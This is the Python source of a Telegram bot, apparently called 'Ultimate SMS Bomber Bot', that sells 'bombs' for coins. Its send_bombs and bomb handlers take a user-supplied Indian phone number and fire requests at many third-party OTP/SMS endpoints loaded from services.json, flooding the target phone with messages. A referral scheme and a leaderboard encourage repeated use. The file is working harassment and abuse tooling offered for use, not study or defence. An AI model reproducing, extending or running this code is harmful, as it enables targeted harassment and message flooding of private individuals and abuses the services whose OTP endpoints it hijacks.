# bot.py
# ULTIMATE SMS BOMBER BOT
# (c) @lordzenox | @zenoxtool

import logging
import asyncio
import json
import random
import requests
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

from config import *
import database as db

# ============================================================
# LOGGING
# ============================================================

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================================
# LOAD APIS FROM services.json
# ============================================================

def load_apis():
    """Load APIs from services.json"""
    try:
        with open(SERVICES_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            apis = data.get('services', [])
            print(f"✅ Loaded {len(apis)} APIs from {SERVICES_FILE}")
            return apis
    except FileNotFoundError:
        print(f"❌ {SERVICES_FILE} not found!")
        return []
    except json.JSONDecodeError:
        print(f"❌ Invalid JSON in {SERVICES_FILE}!")
        return []

# Load APIs
APIS = load_apis()

# ============================================================
# PHONE FORMATTING
# ============================================================

def format_phone(phone, fmt):
    """Format phone number based on format type"""
    phone = phone.strip()
    if fmt == "with_plus91":
        return f"+91{phone}"
    elif fmt == "91-":
        return f"91-{phone}"
    elif fmt == "raw":
        return phone
    return phone

# ============================================================
# SEND BOMBS FUNCTION
# ============================================================

async def send_bombs(phone):
    """Send SMS using multiple APIs"""
    success = 0
    failed = 0
    apis = APIS[:MAX_APIS_PER_BOMB]
    random.shuffle(apis)
    
    for api in apis:
        try:
            formatted = format_phone(phone, api.get('phone_format', 'raw'))
            url = api['url'].replace('{phone}', formatted)
            url = url.replace('+91{phone}', f'+91{phone}')
            
            headers = api.get('headers', {})
            data = api.get('data', {})
            
            # Replace phone in data
            if isinstance(data, dict):
                for k, v in data.items():
                    if isinstance(v, str):
                        data[k] = v.replace('{phone}', formatted)
                        data[k] = data[k].replace('+91{phone}', f'+91{phone}')
            
            # Send request
            if '_raw' in data:
                raw = data['_raw'].replace('{phone}', formatted)
                raw = raw.replace('+91{phone}', f'+91{phone}')
                resp = requests.request(
                    api['method'], url, 
                    headers=headers, 
                    data=raw, 
                    timeout=API_TIMEOUT
                )
            else:
                resp = requests.request(
                    api['method'], url, 
                    headers=headers, 
                    json=data, 
                    timeout=API_TIMEOUT
                )
            
            if resp.status_code in [200, 201, 202, 204]:
                success += 1
                db.update_api_stats(api['name'], True)
            else:
                failed += 1
                db.update_api_stats(api['name'], False)
                
        except Exception as e:
            failed += 1
            db.update_api_stats(api.get('name', 'Unknown'), False)
            logger.error(f"API Error: {e}")
        
        await asyncio.sleep(REQUEST_DELAY)
    
    return success, failed

# ============================================================
# START COMMAND
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    existing = db.get_user(user_id)
    
    if not existing:
        ref = context.args[0] if context.args else None
        db.create_user(user_id, user.username or "User", user.first_name, ref)
    
    balance = db.get_balance(user_id)
    stats = db.get_user_stats(user_id)
    
    text = f"""🔥 **{BOT_NAME}** {VERSION} 🔥

👋 Hello {user.first_name}!

💰 **Balance:** {balance} coins
💣 **Cost:** {BOMB_COST} coins/bomb
📡 **APIs:** {len(APIS)} active
📱 **SMS Sent:** {stats['total_sms'] if stats else 0}

━━━━━━━━━━━━━━━━━━━━━
**Commands:**
/bomb <number> - Start bombing
/balance - Check coins
/refer - Get referral link
/leaderboard - Top users
/status - Bot status
/help - Help menu

━━━━━━━━━━━━━━━━━━━━━
👑 **Owner:** {OWNER}
📢 **Channel:** {CHANNEL1}
"""
    
    keyboard = [
        [InlineKeyboardButton("💣 Bomb Now", switch_inline_query_current_chat="")],
        [InlineKeyboardButton("💰 Balance", callback_data="balance"),
         InlineKeyboardButton("📊 Top Users", callback_data="leaderboard")],
        [InlineKeyboardButton("👥 Referral", callback_data="refer"),
         InlineKeyboardButton("📋 History", callback_data="history")]
    ]
    
    await update.message.reply_text(
        text, 
        reply_markup=InlineKeyboardMarkup(keyboard), 
        parse_mode='Markdown'
    )

# ============================================================
# BOMB COMMAND
# ============================================================

async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check ban
    if db.is_banned(user_id):
        await update.message.reply_text("❌ You are banned from using this bot!")
        return
    
    # Check user exists
    if not db.get_user(user_id):
        await update.message.reply_text("❌ Please use /start first!")
        return
    
    # Check phone number
    if not context.args:
        await update.message.reply_text(
            f"❌ **Usage:** `/bomb 9876543210`\n\n"
            f"📱 Example: `/bomb 9876543210`",
            parse_mode='Markdown'
        )
        return
    
    phone = context.args[0].strip()
    
    # Validate phone
    if not phone.isdigit() or len(phone) < 10:
        await update.message.reply_text(
            "❌ **Invalid phone number!**\n\n"
            "Please enter a valid 10-digit number.",
            parse_mode='Markdown'
        )
        return
    
    # Check balance
    if db.get_balance(user_id) < BOMB_COST:
        await update.message.reply_text(
            f"❌ **Insufficient coins!**\n\n"
            f"Balance: {db.get_balance(user_id)} coins\n"
            f"Need: {BOMB_COST} coins\n\n"
            f"💡 Get more coins via /refer",
            parse_mode='Markdown'
        )
        return
    
    # Deduct coins
    db.deduct_coins(user_id, BOMB_COST, f"Bombing {phone}")
    
    # Start bombing
    msg = await update.message.reply_text(
        f"🔥 **BOMBING STARTED!**\n\n"
        f"📱 Target: `{phone}`\n"
        f"💰 Cost: {BOMB_COST} coins\n"
        f"📡 Sending OTPs from {len(APIS)} APIs...\n\n"
        f"⏳ Please wait...",
        parse_mode='Markdown'
    )
    
    # Send bombs
    success, failed = await send_bombs(phone)
    
    # Update stats
    db.add_bomb_stats(user_id, phone, success + failed, success, failed)
    
    # Result
    result_text = f"""✅ **BOMBING COMPLETE!**

📱 Target: `{phone}`
✅ Success: {success}
❌ Failed: {failed}
📊 Total: {success + failed}
💰 Cost: {BOMB_COST} coins

━━━━━━━━━━━━━━━━━━━━━
🔥 Keep bombing!
💡 /balance - Check coins
👥 /refer - Get free coins
"""
    
    await msg.edit_text(result_text, parse_mode='Markdown')

# ============================================================
# BALANCE COMMAND
# ============================================================

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not db.get_user(user_id):
        await update.message.reply_text("❌ Please use /start first!")
        return
    
    balance = db.get_balance(user_id)
    stats = db.get_user_stats(user_id)
    
    text = f"""💰 **YOUR BALANCE**

Coins: {balance}
Total Bombs: {stats['total_bombs'] if stats else 0}
Total SMS Sent: {stats['total_sms'] if stats else 0}
Referrals: {db.get_referral_count(user_id)}

━━━━━━━━━━━━━━━━━━━━━
💡 /refer - Get referral link
💡 /bomb - Start bombing
"""
    
    await update.message.reply_text(text, parse_mode='Markdown')

# ============================================================
# REFER COMMAND
# ============================================================

async def refer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not db.get_user(user_id):
        await update.message.reply_text("❌ Please use /start first!")
        return
    
    code = db.get_referral_code(user_id)
    bot_username = (await context.bot.get_me()).username
    link = f"https://t.me/{bot_username}?start={code}"
    
    text = f"""👥 **REFERRAL SYSTEM**

Your Code: `{code}`
Your Link: {link}

━━━━━━━━━━━━━━━━━━━━━
💰 **Rewards:**
• You get +{REFERRAL_BONUS} coins per referral
• Friend gets +{FREE_COINS} free coins

📊 Total Referrals: {db.get_referral_count(user_id)}

🔗 Share this link with your friends!
"""
    
    keyboard = [[
        InlineKeyboardButton(
            "📤 Share Link", 
            url=f"https://t.me/share/url?url={link}&text=🔥%20Join%20the%20Ultimate%20SMS%20Bomber%20Bot!%20Get%20free%20coins!"
        )
    ]]
    
    await update.message.reply_text(
        text, 
        reply_markup=InlineKeyboardMarkup(keyboard), 
        parse_mode='Markdown'
    )

# ============================================================
# LEADERBOARD COMMAND
# ============================================================

async def leaderboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = db.get_leaderboard(10)
    
    if not users:
        await update.message.reply_text("❌ No users yet!")
        return
    
    text = "🏆 **TOP 10 USERS**\n\n"
    
    for i, user in enumerate(users, 1):
        user_id, username, coins, bombs, sms = user
        medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
        text += f"{medal} @{username or 'Unknown'} - {coins} coins ({bombs} bombs)\n"
    
    await update.message.reply_text(text, parse_mode='Markdown')

# ============================================================
# STATUS COMMAND
# ============================================================

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = db.get_total_stats()
    
    text = f"""📊 **{BOT_NAME} STATUS**

🤖 Bot: Online ✅
📅 Version: {VERSION}
👥 Total Users: {stats['users']}
💰 Total Coins: {stats['coins']}
💣 Total Bombs: {stats['bombs']}
📱 Total SMS: {stats['sms']}
📡 APIs Loaded: {len(APIS)}
👑 Admins: {len(ADMIN_IDS)}

━━━━━━━━━━━━━━━━━━━━━
⚡ Uptime: 24/7
🔥 Keep bombing!
"""
    
    await update.message.reply_text(text, parse_mode='Markdown')

# ============================================================
# HELP COMMAND
# ============================================================

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = f"""📚 **{BOT_NAME} HELP**

**Commands:**
/start - Start the bot
/bomb <number> - Start bombing
/balance - Check your balance
/refer - Get referral link
/leaderboard - Top users
/status - Bot status
/help - Show this help

**💡 Tips:**
• Get {FREE_COINS} free coins on /start
• Earn {REFERRAL_BONUS} coins per referral
• Each bomb costs {BOMB_COST} coins
• {len(APIS)} APIs available

━━━━━━━━━━━━━━━━━━━━━
**Support:**
👑 Owner: {OWNER}
📢 Channel: {CHANNEL1}
🔗 Update: {CHANNEL2}
"""
    
    await update.message.reply_text(text, parse_mode='Markdown')

# ============================================================
# ADMIN COMMANDS
# ============================================================

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized!")
        return
    
    text = f"""🔐 **ADMIN PANEL**

**Commands:**
/addcoins <user_id> <amount> - Add coins
/removecoins <user_id> <amount> - Remove coins
/ban <user_id> - Ban user
/unban <user_id> - Unban user
/broadcast <message> - Send broadcast
/reloadapis - Reload APIs
/stats - View full stats

📊 Total Users: {db.get_total_stats()['users']}
📡 APIs: {len(APIS)}
"""
    
    await update.message.reply_text(text, parse_mode='Markdown')

async def add_coins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("❌ Usage: /addcoins <user_id> <amount>")
        return
    
    target = int(context.args[0])
    amount = int(context.args[1])
    
    if db.add_coins(target, amount, f"Added by admin"):
        await update.message.reply_text(f"✅ Added {amount} coins to {target}")
    else:
        await update.message.reply_text("❌ Failed to add coins")

async def remove_coins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("❌ Usage: /removecoins <user_id> <amount>")
        return
    
    target = int(context.args[0])
    amount = int(context.args[1])
    
    if db.deduct_coins(target, amount, f"Removed by admin"):
        await update.message.reply_text(f"✅ Removed {amount} coins from {target}")
    else:
        await update.message.reply_text("❌ Failed to remove coins")

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /ban <user_id>")
        return
    
    target = int(context.args[0])
    db.ban_user(target)
    await update.message.reply_text(f"✅ Banned {target}")

async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /unban <user_id>")
        return
    
    target = int(context.args[0])
    db.unban_user(target)
    await update.message.reply_text(f"✅ Unbanned {target}")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /broadcast <message>")
        return
    
    message = " ".join(context.args)
    users = db.get_all_users(1000)
    sent = 0
    
    for user in users:
        try:
            await context.bot.send_message(
                user[0], 
                f"📢 **ANNOUNCEMENT**\n\n{message}", 
                parse_mode='Markdown'
            )
            sent += 1
            await asyncio.sleep(0.1)
        except:
            pass
    
    await update.message.reply_text(f"✅ Broadcast sent to {sent} users")

async def reload_apis(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    
    global APIS
    APIS = load_apis()
    await update.message.reply_text(f"✅ APIs reloaded! Total: {len(APIS)}")

# ============================================================
# CALLBACK HANDLERS
# ============================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "balance":
        bal = db.get_balance(user_id)
        await query.edit_message_text(f"💰 Your balance: {bal} coins")
    
    elif data == "leaderboard":
        users = db.get_leaderboard(5)
        text = "🏆 **TOP USERS**\n\n"
        for i, u in enumerate(users, 1):
            text += f"{i}. @{u[1] or 'Unknown'} - {u[2]} coins\n"
        await query.edit_message_text(text, parse_mode='Markdown')
    
    elif data == "refer":
        code = db.get_referral_code(user_id)
        bot_username = (await context.bot.get_me()).username
        link = f"https://t.me/{bot_username}?start={code}"
        await query.edit_message_text(f"🔗 Your referral link:\n{link}")
    
    elif data == "history":
        transactions = db.get_transactions(user_id, 5)
        if not transactions:
            await query.edit_message_text("📋 No transactions yet!")
            return
        text = "📋 **Last 5 Transactions**\n\n"
        for t in transactions:
            amount, type_, desc, date = t
            sign = "+" if type_ == "credit" else "-"
            text += f"{sign}{amount} coins - {desc}\n"
        await query.edit_message_text(text, parse_mode='Markdown')

# ============================================================
# ERROR HANDLER
# ============================================================

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text(
            "❌ An error occurred. Please try again later."
        )

# ============================================================
# MAIN FUNCTION
# ============================================================

def main():
    """Start the bot"""
    
    # Create application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bomb", bomb))
    app.add_handler(CommandHandler("balance", balance))
    app.add_handler(CommandHandler("refer", refer))
    app.add_handler(CommandHandler("leaderboard", leaderboard))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("help", help_command))
    
    # Admin commands
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("addcoins", add_coins))
    app.add_handler(CommandHandler("removecoins", remove_coins))
    app.add_handler(CommandHandler("ban", ban))
    app.add_handler(CommandHandler("unban", unban))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("reloadapis", reload_apis))
    
    # Callback handler
    app.add_handler(CallbackQueryHandler(button_callback))
    
    # Error handler
    app.add_error_handler(error_handler)
    
    # Start bot
    print(f"🚀 {BOT_NAME} {VERSION} Started!")
    print(f"👑 Owner: {OWNER}")
    print(f"📢 Channel: {CHANNEL1}")
    print(f"📡 APIs Loaded: {len(APIS)}")
    print(f"👥 Admins: {len(ADMIN_IDS)}")
    print("=" * 40)
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
